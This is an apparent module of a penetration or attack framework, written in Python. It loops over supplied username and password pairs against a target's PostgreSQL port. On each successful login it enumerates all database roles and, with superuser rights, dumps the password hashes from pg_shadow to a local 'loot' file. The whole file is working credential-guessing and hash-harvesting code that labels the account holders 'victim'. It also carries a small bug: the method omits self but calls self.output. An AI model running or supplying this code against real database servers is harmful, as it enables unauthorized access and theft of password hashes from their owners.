import psycopg2
from hydra import Exploit

class postgresql(Exploit):
    def __init__(self):
        self.name = "postgresql"
        self.port = 5432
    # def attack(self, ip_address):
    #     pass

    def get_loot(ip_address, credentials):
        more_loot = []
        loot_dict = {}
        ip_address = str(ip_address)
        # go through each secure username
        for victim in credentials:
            username = victim[0]
            password = victim[1]
            file=self.output("Trying to connect to PostgreSQL with IP address {} with:\n username {} and password {}".format(ip_address, username, password))

            # start the log in process
            try:
                trystr = "dbname=postgres host={} user={} password={}".format(ip_address, username, password)
                conn = psycopg2.connect(trystr)
            except psycopg2.OperationalError:
                file=self.output("Authentication failed.")
                continue

            # opens a cursor to perform psql ops    
            cur = conn.cursor()
        
            # enumerates all the usernames, the passwords are md5 hashed 
            # and only in viewable as root
            try:
                cur.execute("select * from pg_roles")
            except (psycopg2.OperationalError, psycopg2.InternalError) as e:
                continue
            # opening up returns
            file=self.output('Success. Gathering all usernames.')
            for l in cur.fetchall():
                # adds if the username is not already in there
                if loot_dict.get(l[0]) == None:
                    loot_dict[l[0]] = ""

            # tries to possibly get md5 hashes if in case it is a superuser
            try:
                cur.execute("select usename, passwd from pg_shadow")
                with open(f"./data/{ip_address}_postgresql_md5.txt", "w") as text_file:
                    for l in cur.fetchall():
                        text_file.write(l[1])
                file=self.output('Success. Gathering all md5 hashes.')
                        
            except psycopg2.ProgrammingError:
                file=self.output('No MD5 hashes found.')
                pass

        for k, v in loot_dict.items():
            more_loot.append((k,))

        return more_loot